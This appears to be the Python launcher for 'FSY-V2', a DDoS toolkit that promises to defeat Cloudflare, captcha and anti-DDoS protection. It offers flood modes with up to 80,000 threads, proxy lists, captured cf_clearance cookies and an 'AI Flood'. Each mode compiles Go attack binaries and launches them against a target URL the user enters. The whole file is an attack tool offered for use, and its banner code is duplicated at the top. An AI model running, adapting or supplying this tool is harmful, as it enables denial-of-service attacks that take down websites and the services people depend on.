#!/usr/bin/env python3
import os
import subprocess
from colorama import Fore, Style, init
init(autoreset=True)
os.system('clear')

print(Fore.RED + Style.BRIGHT + """

""")

#!/usr/bin/env python3
import os
from colorama import Fore, Style, init
init(autoreset=True)
os.system('clear')

print(Fore.RED + Style.BRIGHT + """
███████ ███████ ██    ██
██      ██       ██  ██       
█████   ███████   ████
██           ██    ██
██      ███████    ██
""")
print(Fore.RED + "• FSY-V2\n")

print(Fore.RED + Style.BRIGHT + """
• V2 | MODIFIED BY TEAM FSY
• Powerful For All Kind Of Protection
• Such As Cloudflare, Cloudflare Captcha And Anti-DDoS Sites
• Use VPS For Better Results
• Use This With Your Own Understanding
""")

print(Fore.RED + "\n[+] Methods:")
print(Fore.RED + "• 1 — CRASH | [+]")
print(Fore.RED + "• 2 — Raw")
print(Fore.RED + "• 3 — Captcha Bypass V1 + Crash (automatic)")
print(Fore.RED + "• 4 — Captcha Bypass V2 (Manual Cookies Capture)")
print(Fore.RED + "• 5 — AI Flood (Automatic Ai Attack)\n")

choice = input(Fore.RED + "• Choose (1/2/3/4) → ").strip()

if choice == "1":
    
    print(Fore.RED + "\n[+] CRASH Option:")
    print(Fore.RED + "• 1 — Raw")
    print(Fore.RED + "• 2 — Proxy list")
    print(Fore.RED + "• 3 — Cookies (Solved cf_clearance)\n")
    
        
    mode_choice = input(Fore.RED + "• Choose (1/2/3) → ").strip()
    if mode_choice == "2":
        mode = "proxy"
        file = input(Fore.RED + "• Default: proxies.txt | Proxy file → ").strip() or "proxies.txt"
    elif mode_choice == "3":
        mode = "cookie"
        file = input(Fore.RED + "• Default: solved.txt | Cookie file → ").strip() or "solved.txt"
    else:
        mode = "raw"
        file = ""
    
    threads = input(Fore.RED + "• Default: 5000 | Threads (1000-80000) → ").strip() or "5000"
    
    target = input(Fore.RED + "\n• Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    use_headers = input(Fore.RED + "• Use custom headers? (y/N) → ").strip().lower()
    headers_file = ""
    if use_headers == "y":
        headers_file = input(Fore.RED + "Default: headers.txt | Headers file → ").strip() or "headers.txt"
    
    show_stats = input(Fore.RED + "• Show live stats? (y/N) → ").strip().lower()
    stats_arg = "show" if show_stats == "y" else "silent"
    
        # COMPILE FIRST
    print(Fore.RED + "\n• Compiling a required file...")
    compile_result = subprocess.run(["go", "build", "-o", "quantum_hulk", "quantum_hulk.go"], 
                                  capture_output=True, text=True)
    if compile_result.returncode != 0:
        print(Fore.RED + f"• Compilation failed: {compile_result.stderr}")
    else:
        print(Fore.RED + "• Compilation successful!")
    
    cmd = f"./quantum_hulk ULTIMATE {target} {mode} {threads}"
    if file:
        cmd += f" {file}"
    else:
        cmd += " ''"
    
    cmd += f" {headers_file} {stats_arg}"
    
    print(Fore.RED + f"\n• LAUNCHING ATTACK → {threads} threads\n")
    os.system(cmd)

elif choice == "2":
    target = input(Fore.RED + "• Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    duration = input(Fore.RED + "• Default: 60 | Duration (seconds) → ").strip() or "60"
    
    # COMPILE FIRST
    print(Fore.RED + "\n• Compiling a required file...")
    compile_result = subprocess.run(["go", "build", "-o", "raw", "raw.go"], 
                                  capture_output=True, text=True)
    if compile_result.returncode != 0:
        print(Fore.RED + f"• Compilation failed: {compile_result.stderr}")
        # Fallback to go run
        cmd = f"go run raw.go {target} {duration}"
    else:
        print(Fore.RED + "• Compilation successful!")
        cmd = f"./raw {target} {duration}"
    
    print(Fore.RED + f"\n• LAUNCHING ATTACK → {duration} seconds\n")
    os.system(cmd)

elif choice == "3":
    target = input(Fore.RED + "• Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    proxy_file = input(Fore.RED + "• Default: proxies.txt | Proxy file → ").strip() or "proxies.txt"
    output_file = input(Fore.RED + "• Default: solved.txt | Output file → ").strip() or "solved.txt"
    
    # COMPILE FIRST
    print(Fore.RED + "\n• Compiling a required file...")
    compile_result = subprocess.run(["go", "build", "-o", "solver", "solve.go"], 
                                  capture_output=True, text=True)
    if compile_result.returncode != 0:
        print(Fore.RED + f"• Compilation failed: {compile_result.stderr}")
        # Fallback to go run
        cmd = f"go run solve.go {target} {proxy_file} {output_file}"
    else:
        print(Fore.RED + "• Compilation successful!")
        cmd = f"./solver {target} {proxy_file} {output_file}"
    
    print(Fore.RED + f"\n• LAUNCHING CAPTCHA BYPASS → {proxy_file}\n")
    os.system(cmd)

elif choice == "4":
    target = input(Fore.RED + "• Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    solved_file = input(Fore.RED + "• Default: solved.txt | Solved cookies file → ").strip() or "solved.txt"
    threads = input(Fore.RED + "• Default: 5000 | Threads (1000-80000) → ").strip() or "5000"
    
    use_headers = input(Fore.RED + "• Use custom headers? (y/N) → ").strip().lower()
    headers_file = ""
    if use_headers == "y":
        headers_file = input(Fore.RED + "• Default: headers.txt | Headers file → ").strip() or "headers.txt"
    
    # COMPILE FIRST
    print(Fore.RED + "\n• Compiling a required file...")
    compile_result = subprocess.run(["go", "build", "-o", "quantum_hulk", "quantum_hulk.go"], 
                                  capture_output=True, text=True)
    if compile_result.returncode != 0:
        print(Fore.RED + f"• Compilation failed: {compile_result.stderr}")
    else:
        print(Fore.RED + "• Compilation successful!")
    
    show_stats = input(Fore.RED + "• Show live stats? (y/N) → ").strip().lower()
    stats_arg = "show" if show_stats == "y" else "silent"
    
    cmd = f"./quantum_hulk ULTIMATE {target} cookie {threads} {solved_file} {headers_file} {stats_arg}"
    
    print(Fore.RED + f"\n• LAUNCHING WITH SOLVED COOKIES → {threads} threads\n")
    os.system(cmd)
    
elif choice == "5":
    target = input(Fore.RED + "• Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    duration = input(Fore.RED + "• Default: 60 | Duration (seconds) → ").strip() or "60"
    proxy_file = input(Fore.RED + "• Default: proxies.txt | Proxy file → ").strip() or "proxies.txt"
    
    # COMPILE FIRST
    print(Fore.RED + "\n• Compiling a required file...")
    compile_result = subprocess.run(["go", "build", "-o", "Ai_flood", "Ai_flood.go"], 
                                  capture_output=True, text=True)
    if compile_result.returncode != 0:
        print(Fore.RED + f"• Compilation failed: {compile_result.stderr}")
        print(Fore.RED + "• Installing dependencies and retrying...")
        subprocess.run(["go", "get", "go.uber.org/zap"], capture_output=True)
        subprocess.run(["go", "get", "golang.org/x/net/http2"], capture_output=True)
        subprocess.run(["go", "get", "golang.org/x/net/publicsuffix"], capture_output=True)
        
        compile_result = subprocess.run(["go", "build", "-o", "Ai_flood", "Ai_flood.go"], 
                                      capture_output=True, text=True)
        if compile_result.returncode != 0:
            print(Fore.RED + f"• Compilation still failed: {compile_result.stderr}")
            cmd = f"go run Ai_flood.go {target} {duration} {proxy_file}"
        else:
            print(Fore.RED + "• Compilation successful!")
            cmd = f"./Ai_flood {target} {duration} {proxy_file}"
    else:
        print(Fore.RED + "• Compilation successful!")
        cmd = f"./Ai_flood {target} {duration} {proxy_file}"
    
    print(Fore.RED + f"\n• LAUNCHING AI FLOOD → {duration} seconds | PROXIES: {proxy_file}\n")
    os.system(cmd)

else:
    print(Fore.RED + "• Invalid choice!")